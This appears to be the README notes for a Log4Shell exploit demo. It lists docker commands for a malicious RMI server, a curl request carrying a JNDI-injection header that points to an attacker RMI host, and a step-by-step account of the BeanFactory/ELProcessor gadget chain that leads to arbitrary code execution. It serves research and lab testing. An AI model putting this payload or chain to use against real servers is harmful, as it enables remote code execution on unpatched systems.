$ docker build -t evil:latest .
$ docker run -p 1097:1097 evil:latest

////////

# vulnerable application container is also running
$ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:rmi://<EVIL-RMI-IP>:1097/Object}'

https://github.com/drahosj/log4shell-vulnerable-app

credit: https://www.veracode.com/blog/research/exploiting-jndi-injections-java


///////

Actual notes:

Uses the technique (BeanFactory + ELProcessor + "forceString") highlighted 
in https://www.veracode.com/blog/research/exploiting-jndi-injections-java. The
tl;dr on that:

1. A ResourceRef overrides the normal JNDI reference behavior with a set of
key=value pairs intended to populate a Bean via setters
2. Java stil lets you specify a custom factor, if that factory is in the
classpath.
3. BeanFactory works with ResourceRefs to call the setters and populate the new
bean.
4. the forceString directive in a ResourceRef lets you override the name of a
setter from setFoo to anything you want; when assigning foo it will call that
name.
5. the ELProcessor class works as a gadget, since its eval method is a valid
bean setter (though named incorrectly). 
6. Create a forceString rule to set "x" by calling "eval" - x doesn't even have
to be a real field of ELProcessor
7. Try to set x to a string
8. BeanFactory calls ELProcessor.eval() on the string, because forceString makes
eval() the setter for x
9. Execute arbitrary EL

Other gadget classes probably exist. This demo only works against a patched
version of the vulnerable app that hacks the gadget classes into the classpath.
Note that it's not entirely unreasonable for the relevant jars to be included -
any full tomcat deployment (not just spring-boot's embedded tomcat) will
definitely have them.

- A note on Java versions
Using gadgets seems to be possible even on the most current java, and
the gadgets still exist on current versions of stuff.

This compiles with a slightly older JDK just to avoid problems with the
"internal and proprietary" ReferenceWrapper class. Recent JDKs really complain
about that a lot - easiest solution is to just stick to one that doesn't.
